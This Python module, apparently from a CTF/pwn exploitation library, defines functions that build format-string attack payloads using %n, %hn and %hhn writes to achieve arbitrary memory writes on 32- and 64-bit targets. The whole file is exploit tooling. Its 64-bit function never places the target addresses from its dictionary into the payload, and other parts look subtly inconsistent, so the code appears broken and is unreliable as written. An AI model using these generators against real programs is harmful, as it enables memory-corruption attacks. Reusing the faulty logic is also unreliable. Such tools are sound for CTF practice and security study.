from logging import getLogger

from toyotama.pwn.util import p32, p64

logger = getLogger(__name__)


def fsa_write_32(value: int, nth_stack: int, target_addr: int | None = None, offset: int = 0, each: int = 4) -> bytes:
    """Arbitrary write using format string bug (32bit)

    Args:
        value (int): The value to write.
        nth_stack (int): example
                    "AAAA%p %p %p..."
                    -> AAAA0x1e 0xf7f6f580 0x804860b 0xf7f6f000 0xf7fbb2f0 (nil) 0x4141d402
                    -> 7th (0x4141d402)
        target_addr (int): The address where the content will be written.
        offset (int, optional): From above example, offset is 2 (0x4141d402).
        each (int, optional): Write the value by each n bytes.
    Returns:
        bytes: The payload
    """
    assert each in (1, 2, 4)

    format_string = {
        1: "hhn",
        2: "hn",
        4: "n",
    }

    BIT_WIDTH = 32
    BYTE_WIDTH = BIT_WIDTH // 8

    # Adjust stack alignment
    payload = b"A" * (-offset % BYTE_WIDTH)
    if offset != 0:
        nth_stack += 1

    if target_addr:
        for i in range(0, BYTE_WIDTH, each):
            payload += p32(target_addr + i)

    max_value = 1 << (8 * each)  # 256 for hhn, 65536 for hn, etc.
    written = len(payload)

    for i in range(0, BYTE_WIDTH, each):
        target_byte = value % max_value
        diff = (target_byte - written) % max_value
        if diff == 0:
            # No %c needed, just write current count
            payload += f"%{nth_stack}${format_string[each]}".encode()
        else:
            payload += f"%{diff}c%{nth_stack}${format_string[each]}".encode()
            written = target_byte
        value >>= 8 * each
        nth_stack += 1

    return payload


def fsa_write_64(write_dict: dict[int, int], nth_stack: int, written_bytes_num: int = 0, offset: int = 0, each: int = 4) -> bytes:
    """Arbitrary write using format string bug (64bit)

    Args:
        write_dict (dict[int, int]): A dictionary of {address: value} pairs to write.
        nth_stack (int): example
                    "AAAA%p %p %p..."
                    -> AAAA0x1e 0xf7f6f580 0x804860b 0xf7f6f000 0xf7fbb2f0 (nil) 0x4141d402
                    -> 7th (0x4141d402)
        written_bytes_num (int, optional): Number of bytes already written. Defaults to 0.
        offset (int, optional): From nth_stack's example, offset is 2 (0x4141d402).
        each (int, optional): Write the value by each n bytes.
    Returns:
        bytes: The payload
    """
    assert each in (1, 2, 4)

    format_string = {
        1: "hhn",
        2: "hn",
        4: "n",
    }

    BIT_WIDTH = 64
    BYTE_WIDTH = BIT_WIDTH // 8

    payload = b""

    if offset:
        payload += b"A" * offset
        payload = payload.ljust(BYTE_WIDTH, b"A")  # Align stack
        nth_stack += 1

    max_value = 1 << (8 * each)

    for addr, value in write_dict.items():
        value_bytes = p64(value)
        for i in range(0, BYTE_WIDTH, each):
            target_byte = int.from_bytes(value_bytes[i : i + each], "little")
            diff = (target_byte - written_bytes_num) % max_value
            if diff == 0:
                payload += f"%{nth_stack:03}${format_string[each]}".encode()
            else:
                payload += f"%{diff:010}c%{nth_stack:03}${format_string[each]}".encode()
                written_bytes_num = target_byte
            nth_stack += 1

    payload += b"A" * (-len(payload) % BYTE_WIDTH)  # Align stack

    if b"\0" in payload.strip(b"\0"):
        logger.warning("The payload includes some null bytes.")

    return payload
